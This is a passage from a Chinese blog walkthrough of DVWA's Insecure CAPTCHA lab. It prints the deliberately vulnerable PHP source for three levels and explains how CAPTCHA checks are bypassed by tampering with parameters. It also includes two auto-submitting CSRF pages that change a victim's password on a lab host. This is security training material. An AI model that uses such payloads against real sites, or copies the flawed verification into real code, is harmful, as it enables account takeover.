<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/47.png" alt></p>
<p>也可以参考：<a href="https://www.itfd.cn/post-758.html" target="_blank" rel="noopener">https://www.itfd.cn/post-758.html</a></p>
<p>这边我就不配置了</p>
<h3 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">'recaptcha_private_key'</span>],</span><br><span class="line">        $_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">        $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\"#\" method=\"POST\"&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">            $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        $hide_form = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作，但是这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step参数判断用户是否已经输入正确的验证码。</p>
<p>漏洞利用</p>
<p>1.通过构造参数绕过验证过程的第一步</p>
<p>首先输入密码，点击Change按钮，burpsuite进行抓包</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/48.png" alt></p>
<p>因为设置了拦截报文的代理，没有挂梯子，所以没有成功显示验证码，发送请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数，更改step参数绕过验证码：</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/49.png" alt></p>
<p>修改密码成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/50.png" alt></p>
<p>2.由于没有任何的防护CSRF机制，可以构造攻击页面进行更改，代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>      </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"document.getElementById('transfer').submit()"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://172.18.9.91/DVWA-master/vulnerabilities/captcha/"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"123456"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"123456"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"step"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当受害者访问该页面时，攻击脚本会伪造改密请求发送给服务器。缺点是受害者会看到密码修改成功的界面，从而意识到自己受到攻击。</p>
<h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">        $_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">        $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\"#\" method=\"POST\"&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">            $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1</span></span><br><span class="line">    <span class="keyword">if</span>( !$_POST[ <span class="string">'passed_captcha'</span> ] ) &#123;</span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"</span>;</span><br><span class="line">        $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        $hide_form = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码中可以看到，Medium级别的代码在第二步验证时，将参数passed_captcha进行检查，如果参数值为true，则认为用户已经通过了验证码的检查，但是用户依然可以通过伪造参数绕过验证，本质上来说，这和low级别的验证没区别。</p>
<p>漏洞利用</p>
<p>1.提交数据，抓取报文，更改step参数并增加passed_captcha参数，绕过验证码。</p>
<p>抓取包：</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/51.png" alt></p>
<p>修改包的相应内容：</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/52.png" alt></p>
<p>发送报文后，提示更改密码成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/53.png" alt></p>
<p>2.使用CSRF攻击方式，源码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"document.getElementById('transfer').submit()"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://172.18.9.91/DVWA-master/vulnerabilities/captcha/"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passed_captcha"</span> <span class="attr">value</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"step"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当攻击者访问页面时，攻击脚本就会伪造改密请求发送给服务器，不过依然会跳转到更改密码成功的界面。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/54.png" alt></p>
<h3 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">        $_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        $resp || </span><br><span class="line">        (</span><br><span class="line">            $_POST[ <span class="string">'g-recaptcha-response'</span> ] == <span class="string">'hidd3n_valu3'</span></span><br><span class="line">            &amp;&amp; $_SERVER[ <span class="string">'HTTP_USER_AGENT'</span> ] == <span class="string">'reCAPTCHA'</span></span><br><span class="line">        )</span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span> ($pass_new == $pass_conf) &#123;</span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"' LIMIT 1;"</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Ops. Password mismatch</span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">            $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">        $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

